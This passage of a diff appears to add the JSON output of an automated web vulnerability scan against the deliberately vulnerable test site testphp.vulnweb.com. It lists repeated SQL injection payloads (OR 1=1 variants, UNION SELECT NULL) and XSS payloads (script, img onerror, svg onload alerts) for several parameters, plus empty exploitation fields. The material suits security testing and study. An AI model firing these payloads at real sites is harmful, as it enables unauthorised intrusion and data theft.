+      "details": "Unusual response received"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter message",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?message=<script>alert(\"XSS\")</script>",
+      "parameter": "message",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter user",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?user=' OR '1'='1",
+      "parameter": "user",
+      "payload": "' OR '1'='1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter message",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?message=<img src=x onerror=alert(\"XSS\")>",
+      "parameter": "message",
+      "payload": "<img src=x onerror=alert(\"XSS\")>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter user",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?user=\" OR \"1\"=\"1",
+      "parameter": "user",
+      "payload": "\" OR \"1\"=\"1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter message",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?message=javascript:alert(\"XSS\")",
+      "parameter": "message",
+      "payload": "javascript:alert(\"XSS\")",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter user",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?user=' OR 1=1--",
+      "parameter": "user",
+      "payload": "' OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter message",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?message=<svg onload=alert(\"XSS\")>",
+      "parameter": "message",
+      "payload": "<svg onload=alert(\"XSS\")>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter user",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?user=\" OR 1=1--",
+      "parameter": "user",
+      "payload": "\" OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter message",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?message=\"><script>alert(\"XSS\")</script>",
+      "parameter": "message",
+      "payload": "\"><script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter user",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?user=' UNION SELECT NULL--",
+      "parameter": "user",
+      "payload": "' UNION SELECT NULL--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter username",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?username='",
+      "parameter": "username",
+      "payload": "'",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter message",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?message='><script>alert(\"XSS\")</script>",
+      "parameter": "message",
+      "payload": "'><script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter username",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?username=\"",
+      "parameter": "username",
+      "payload": "\"",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter username",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?username=' OR '1'='1",
+      "parameter": "username",
+      "payload": "' OR '1'='1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter username",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?username=\" OR \"1\"=\"1",
+      "parameter": "username",
+      "payload": "\" OR \"1\"=\"1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter username",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?username=' OR 1=1--",
+      "parameter": "username",
+      "payload": "' OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter username",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?username=\" OR 1=1--",
+      "parameter": "username",
+      "payload": "\" OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter username",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?username=' UNION SELECT NULL--",
+      "parameter": "username",
+      "payload": "' UNION SELECT NULL--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter email",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?email='",
+      "parameter": "email",
+      "payload": "'",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter email",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?email=\"",
+      "parameter": "email",
+      "payload": "\"",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter email",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?email=' OR '1'='1",
+      "parameter": "email",
+      "payload": "' OR '1'='1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter email",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?email=\" OR \"1\"=\"1",
+      "parameter": "email",
+      "payload": "\" OR \"1\"=\"1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter email",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?email=' OR 1=1--",
+      "parameter": "email",
+      "payload": "' OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter email",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?email=\" OR 1=1--",
+      "parameter": "email",
+      "payload": "\" OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter email",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?email=' UNION SELECT NULL--",
+      "parameter": "email",
+      "payload": "' UNION SELECT NULL--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    }
+  ],
+  "exploitation_results": {},
+  "post_exploitation_data": {}
+}
